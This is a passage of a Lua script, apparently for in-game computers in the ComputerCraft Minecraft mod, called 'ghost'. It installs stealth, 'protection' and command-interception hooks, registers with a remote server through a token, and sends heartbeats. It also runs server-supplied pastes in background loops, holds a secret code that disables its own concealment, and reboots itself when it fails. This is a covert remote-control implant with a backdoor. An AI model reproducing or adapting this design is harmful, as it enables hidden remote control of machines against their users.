                disable_stealth(); disable_protection(); disable_command_intercept()
                glog("mode_watcher: Telegram service ON")
            elseif mode ~= "service" and telegram_service then
                telegram_service = false; service_local = false
                install_stealth(); install_protection(); install_command_intercept()
                glog("mode_watcher: Telegram service OFF")
            end
        end)
    end
end

-- ============================================
-- REPL
-- ============================================
local function repl()
    while true do
        if fortress_active then return end
        if service_local then
            term.setTextColour(colors.green); term.setCursorBlink(true); write("[SERVICE] > ")
            local line = read(nil, cmd_history, orig_shell_complete)
            if line == UPDATE_CODE then if do_update() then return end
            elseif line and line ~= "" then
                cmd_history[#cmd_history+1] = line
                local o, e = pcall(orig_shell_run, line)
                if not o then printError(e or "Error") end
            end
        else
            term.setTextColour(colors.yellow); term.setCursorBlink(true); write("> ")
            local line = read(nil, cmd_history, normal_complete)
            if line == UPDATE_CODE then if do_update() then return end
            elseif line == SECRET_CODE then
                service_local = true
                disable_stealth(); disable_protection(); disable_command_intercept()
                term.setBackgroundColor(colors.black); term.setTextColour(colors.white)
                term.clear(); term.setCursorPos(1, 1)
                print("=== SECRET SERVICE MODE ===\nProtection: DISABLED\nStealth: DISABLED\nInterception: DISABLED\n\nActive until reboot.\n")
                glog("SECRET: service mode activated")
            elseif line and line ~= "" then
                cmd_history[#cmd_history+1] = line
                local o, e = pcall(shell.run, line)
                if not o then printError(e or "Error") end
            end
        end
    end
end

-- ============================================
-- MAIN
-- ============================================
local function run_main()
    glog("ghost start v9.9.5")
    install_stealth(); install_protection(); install_command_intercept(); load_mode()
    if not orig_fs_exists(SANDBOX_DIR) then pcall(fs.makeDir, SANDBOX_DIR) end
    draw_boot()

    local url = load_saved_url()
    if url then CURRENT_URL = url; TRUSTED_DOMAIN = extract_domain(url) end
    note("saved URL: " .. tostring(CURRENT_URL))
    local token = load_token()

    local connected = false
    local pastes = {}
    
    if token then
        note("token found, connecting...")
        for attempt = 1, 5 do
            refresh_url()
            note("attempt " .. attempt .. " -> " .. tostring(CURRENT_URL))
            if CURRENT_URL then
                local mode, p2 = check_mode(token)
                if mode then 
                    connected = true; pastes = p2 or {}
                    note("connected, mode=" .. mode)
                    break 
                end
            end
            sleep(3)
        end
        if not connected then 
            note("connect failed after 5 attempts")
            pastes = {}
        end
    end

    if not token then
        if not CURRENT_URL then 
            CURRENT_URL = get_valid_url()
        end
        
        if CURRENT_URL then
            local attempt = 0
            while not token do
                attempt = attempt + 1
                note("registration attempt " .. attempt)
                write("Password: ")
                local pw = read("*")
                
                if pw and pw ~= "" then
                    refresh_url()
                    if not CURRENT_URL then
                        print("No URL, trying to get fresh...")
                        sleep(3)
                        refresh_url()
                    end
                    if CURRENT_URL then
                        token = register_sync(CURRENT_URL, pw)
                        if token then
                            local saved = save_token(token)
                            if saved then
                                note("token saved OK")
                                for a = 1, 3 do
                                    refresh_url()
                                    local mode, p2 = check_mode(token)
                                    if mode then
                                        connected = true
                                        pastes = p2 or {}
                                        note("connected after register, mode=" .. mode)
                                        break
                                    end
                                    sleep(2)
                                end
                                break
                            else
                                print("❌ Token save FAILED! Retrying in 5s...")
                                token = nil
                                sleep(5)
                            end
                        else
                            print("❌ Registration failed. Retrying in 5s...")
                            sleep(5)
                            refresh_url()
                        end
                    else
                        print("❌ No URL available. Retrying in 5s...")
                        sleep(5)
                    end
                else
                    print("❌ Password cannot be empty")
                    sleep(1)
                end
            end
        else
            note("no URL available, exiting")
            return
        end
        draw_boot()
    end

    if connected and current_mode == "service" then
        note("service mode detected, waiting for switch...")
        disable_stealth(); disable_protection(); disable_command_intercept()
        service_local = true
        while true do
            sleep(5)
            local mode = check_mode(token)
            if not mode then break end
            if mode ~= "service" then 
                note("service mode ended"); 
                break 
            end
        end
        service_local = false
        install_stealth(); install_protection(); install_command_intercept()
    end

    parallel.waitForAny(
        function()
            local o, e = pcall(repl)
            if not o then glog("repl crash: " .. tostring(e)) end
        end,
        function()
            if not token then 
                while true do sleep(60) end 
            end
            local funcs = {
                function() heartbeat_loop(token) end,
                function() mode_watcher(token) end,
            }
            for _, p in ipairs(pastes) do
                local pn = p
                funcs[#funcs+1] = function() run_paste_loop(pn, token) end
            end
            local o, e = pcall(parallel.waitForAll, table.unpack(funcs))
            if not o then glog("background crash: " .. tostring(e)) end
        end
    )

    if fortress_active then fortress_console() end
end

local ok, err = pcall(run_main)
if not ok then
    local e = tostring(err)
    if e:find("Terminated") then 
        authentic_shutdown()
    else 
        gerr("run_main", err)
        printError("Ghost error: " .. e)
        print("\nRestarting in 5 seconds...")
        sleep(5)
        orig_reboot()
    end
end
